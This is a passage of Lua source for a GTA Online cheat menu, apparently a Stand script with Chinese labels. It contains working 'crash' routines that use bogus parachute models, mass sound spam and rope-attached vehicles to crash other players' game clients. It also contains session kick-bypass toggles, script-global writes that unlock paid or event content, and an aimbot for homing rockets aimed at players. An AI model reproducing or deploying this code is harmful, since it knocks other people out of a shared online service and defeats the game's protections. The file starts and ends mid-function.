        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 300, false, true, true)
        util.yield(500)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 1381105889)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(500)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 25 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(150)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(150)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    --^^
    for n = 0 , 2 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)


    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(300)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)

    for i = 1, 10 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    for i = 1, 2 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 150, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    for i = 1, 2 do
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(200)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(4500)
    for i = 1, 2 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)

end
util.toast("崩溃完成")
end)




menu.action(crashall,"大自然全局崩溃",{},"",function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
        util.yield(80)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    end)


menu.action(crashall,"声音崩溃", {}, "", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
    local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
end)

menu.action(crashall,"PED伞崩",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash =192829538
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 	192829538
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)
menu.action(crashall, "载具伞崩", {}, "", function ()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

    end)
menu.action(crashall, "CARGO崩溃", {}, "", function()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
end)


local servicios = menu.list(online, "服务", {}, "")

menu.action(servicios, "申请直升机", {}, "申请一架直升机到你的位置", function(on_toggle)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        ryze.int(2793044 + 888, 1)
        ryze.int(2793044 + 895, 1)
	end
end)

local recovery = menu.list(online, "恢复", {}, "")

local coleccionables = menu.list(recovery, "收藏品(风险)", {}, "")

menu.click_slider(coleccionables, "Dvd's", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x0, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Hidden Caches", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x1, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Treasure Chest", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x2, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Radio Antennas", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x3, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "USBs", {""}, "", 0, 19, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x4, i, 1, 1, 1})
end)

menu.action(coleccionables, "Shipwrecks", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x5, 0, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Burried", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x6, i, 1, 1, 1})
end)

menu.action(coleccionables, "Halloween Shirts", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x7, 1, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Lanterns", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x8, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Organic Products", {""}, "", 0, 99, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x9, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Junk Energy Free Flight", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0xA, i, 1, 1, 1})
end)

local drugwars = menu.list(recovery, "毒品战争", {}, "")

menu.action(drugwars, "解锁50车库", {}, "", function()
    util.toast("Starting Process.")
    util.toast("Takes 2s aprox.")
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.SET_ENTITY_COORDS(player, -285.96716, 273.57812, 89.13905, 1, false)
    util.yield(1000)
    memory.write_byte(memory.script_global(262145 + 32702), 1)
    memory.write_byte(memory.script_global(262145 + 32688), 0)
    util.toast("Finished, enjoy.")
end)

menu.action(drugwars, "解锁XMass内容", {}, "需要切换战局", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)

menu.action(drugwars, "解锁DLC内容", {}, "换战局会删除", function()
    for i = 33974, 34112, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.action(drugwars, "解锁任务", {}, "解锁新的任务", function()
    menu.trigger_commands("scripthost")
    util.yield(50)
    for i = 33910, 34794, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.toggle_loop(drugwars, "出租车任务", {}, "", function() 
    menu.trigger_commands("scripthost")
    if memory.read_byte(memory.script_global(262145 + 33770)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 33770), 1)
    return end
end)

local bypasskick = menu.list(online, "踢出保护", {}, "在你被阻止进入战局时使用其他方式加入")

menu.divider(bypasskick, "一般方法")

menu.toggle(bypasskick, "V1", {}, "给你一个有限的时间来驱逐那个阻止你的玩家", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "V2", {}, "功能更强大一点，但也有更多的bug", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
    end
end)

menu.toggle(bypasskick, "V3", {}, "更实用的方法，但对于开发人员，你会收到所有网络事件的通知", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("现在进入您的战局并准备开始踢")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("ojbk")
end
end)

menu.toggle(bypasskick, "V4", {}, "可能会破坏战局，风险自负", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
		menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_command(DontAsk, "on")
        menu.trigger_commands("skipswoopdown on")
        util.toast("现在进入您的战局并准备开始踢")
    else
        menu.trigger_commands("nobgscript off")
		menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_command(DontAsk, "off")
        menu.trigger_commands("skipswoopdown off")
    end
end)

local testmeth = menu.list(bypasskick, "还在测试的方法", {}, "阅读所有注释说明")

menu.divider(testmeth, "第一步", {}, "")

menu.toggle(testmeth, "打开这个", {}, "在输入名字之前打开这个，在第三步关闭", function(on)
    if on then
        menu.trigger_commands("bkick1 on")
    else
        menu.trigger_commands("bkick1 off")
    end
end)

menu.divider(testmeth, "第二步", {}, "")

menu.text_input(testmeth, "通过名字加入", {"name"}, "输入玩家名字，加入他们战局", function(playername)
    menu.trigger_commands("historyspectate".. playername)
end)

menu.divider(testmeth, "第三步", {}, "")

menu.text_input(testmeth, "通过名字踢出", {"name2"}, "卸下玩家名字，踢他", function(playername)
    menu.trigger_commands("kick".. playername)
end)

menu.divider(testmeth, "Step 3", {}, "")
menu.action(testmeth, "点我", {}, "踢他之后就按这个", function()
    menu.trigger_commands("rejoin")
end)
----武器选项
----RPG自动瞄准器
function GetClosestPlayerWithRange_Whitelist(range, inair)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[pid] then --this is the whitelist check.
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end
function RPG_Automatic_sight(on)
    if on then
        local Chosen_Rocket_Hash = "-1707997257"
        while true do
            local localped = GetLocalPed()
            local localcoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
            RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, Chosen_Rocket_Hash, false, true, true, true)
            local p
            if missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif missile_settings.multiped then
                if missile_settings.air_target then
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif not missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, false)
                end
            end
            local ppcoords = ENTITY.GET_ENTITY_COORDS(p)
            if (RRocket ~= 0) and (p ~= nil) and (not PED.IS_PED_DEAD_OR_DYING(p)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)]) and (PED.IS_PED_SHOOTING(localped)) and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (ppcoords.z > 1) then
                util.create_thread(function ()
                    local plocalized = p
                    local msl = RRocket
                    if missile_settings.multitarget then
                        MISSILE_ENTITY_TABLE[#MISSILE_ENTITY_TABLE+1] = plocalized
                    end
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, plocalized, 17) and missile_settings.los) or not missile_settings.los or MISL_AIR then
                        if SE_Notifications then
                            util.toast("前兆完成！")
                        end
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                            for i = 1, 10 do
                                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            end
                        else
                            if SE_Notifications then
                                util.toast("有控制权")
                            end
                        end
                        local aircount = 1
                        Missile_Camera = 0
                        STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                            STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                            util.yield()
                        end
                        GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                        while ENTITY.DOES_ENTITY_EXIST(msl) do
                            if SE_Notifications then
                                util.toast("rocket exists")
                            end
                            local pcoords2 = ENTITY.GET_ENTITY_COORDS(plocalized)
                            local pcoords = GetTableFromV3Instance(pcoords2)
                            local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                            local lc = GetTableFromV3Instance(lc2)
                            local look2 = v3.lookAt(lc2, pcoords2)
                            local look = GetTableFromV3Instance(look2)
                            local dir2 = v3.toDir(look2)
                            local dir = GetTableFromV3Instance(dir2)
                            if missile_settings.ptfx then
                                STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                                    STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                    util.yield()
                                end
                                GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(missile_particles.name, lc.x, lc.y, lc.z, 0, 0, 0, 0.4 * missile_settings.ptfx_scale, false, false, false, true)
                            end
                            if aircount < 2 and MISL_AIR then
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 0, 2700, true, false, true, true)
                                    aircount = aircount + 1
                                    util.yield(1100)
                                end
                            end
                            local lookCountD = 0
                            if MISL_AIR then
                                if missile_settings.cam then
                                    if not CAM.DOES_CAM_EXIST(Missile_Camera) then
                                        if SE_Notifications then
                                            util.toast("相机设置")
                                        end
                                        CAM.DESTROY_ALL_CAMS(true)
                                        Missile_Camera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                                        CAM.SET_CAM_ACTIVE(Missile_Camera, true)
                                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                                    end
                                end
                                local distx = math.abs(lc.x - pcoords.x)
                                local disty = math.abs(lc.y - pcoords.y)
                                local distz = math.abs(lc.z - pcoords.z)
                                if missile_settings.cam then
                                    local ddisst = GENERIC_SYSTEM.VDIST(pcoords.x, pcoords.y, pcoords.z, lc.x, lc.y, lc.z)
                                    if ddisst > 50 then
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
